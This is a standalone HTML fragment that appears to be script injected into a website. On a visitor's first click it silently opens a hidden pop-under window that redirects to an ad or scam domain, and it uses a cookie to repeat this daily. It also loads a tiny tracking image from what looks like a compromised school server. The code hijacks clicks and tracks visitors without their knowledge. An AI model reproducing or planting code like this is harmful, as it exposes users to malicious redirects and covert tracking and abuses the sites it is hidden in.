<script>
    function GetWindowHeight() {
        var a = 0;
        return "number" == typeof _Top.window.innerHeight ? a = _Top.window.innerHeight : _Top.document.documentElement && _Top.document.documentElement.clientHeight ? a = _Top.document.documentElement.clientHeight : _Top.document.body && _Top.document.body.clientHeight && (a = _Top.document.body.clientHeight), a
    }

    function GetWindowWidth() {
        var a = 0;
        return "number" == typeof _Top.window.innerWidth ? a = _Top.window.innerWidth : _Top.document.documentElement && _Top.document.documentElement.clientWidth ? a = _Top.document.documentElement.clientWidth : _Top.document.body && _Top.document.body.clientWidth && (a = _Top.document.body.clientWidth), a
    }

    function GetWindowTop() {
        return void 0 != _Top.window.screenTop ? _Top.window.screenTop : _Top.window.screenY
    }

    function GetWindowLeft() {
        return void 0 != _Top.window.screenLeft ? _Top.window.screenLeft : _Top.window.screenX
    }

    function doOpen(url) {
        var popURL = "about:blank",
            popID = "ad_" + Math.floor(89999999 * Math.random() + 1e7),
            pxLeft = 0,
            pxTop = 0;
        if (pxLeft = GetWindowLeft() + GetWindowWidth() / 2 - PopWidth / 2, pxTop = GetWindowTop() + GetWindowHeight() / 2 - PopHeight / 2, 1 == puShown) return !0;
        var PopWin = _Top.window.open(popURL, popID, "toolbar=0,scrollbars=1,location=1,statusbar=1,menubar=0,resizable=1,top=" + pxTop + ",left=" + pxLeft + ",width=" + PopWidth + ",height=" + PopHeight);
        return PopWin && (puShown = !0, 0 == PopFocus && (PopWin.blur(), navigator.userAgent.toLowerCase().indexOf("applewebkit") > -1 && (_Top.window.blur(), _Top.window.focus())), PopWin.Init = function(e) {
            with(e) Params = e.Params, Main = function() {
                if (void 0 !== window.mozPaintCount) {
                    window.open("about:blank").close()
                }
                var b = Params.PopURL;
                try {
                    opener.window.focus()
                } catch (a) {}
                window.location = b
            }, Main()
        }, PopWin.Params = {
            PopURL: url
        }, PopWin.Init(PopWin)), PopWin
    }

    function setCookie(a, b, c) {
        var d = new Date;
        d.setTime(d.getTime() + c), document.cookie = a + "=" + b + "; path=/;; expires=" + d.toGMTString()
    }

    function getCookie(a) {
        for (var c, d, e, b = document.cookie.toString().split("; "), f = 0; f < b.length; f++)
            if (c = b[f].split("="), d = c[0], e = c[1], d == a) return e;
        return null
    }

    function initPu() {
        if (_Top = self, top != self) try {
            top.document.location.toString() && (_Top = top)
        } catch (a) {}
        document.attachEvent ? document.attachEvent("onclick", checkTarget) : document.addEventListener && document.addEventListener("click", checkTarget, !1)
    }

    function checkTarget(a) {
        if (!getCookie("popundr")) {
            var a = a || window.event;
            doOpen("http://checkalldir.bid/index/?MCPKV8");
            setCookie("popundr", 1, 864e5)
        }
    }
    var puShown = !1,
        PopWidth = 1370,
        PopHeight = 800,
        PopFocus = 0,
        _Top = null;
    initPu();
</script><img src="http://www.liceobelgrano.edu.ar/ico.php?id=30f89abf30a142c8e5a10cfb7764b3bd" height="3" width="3">
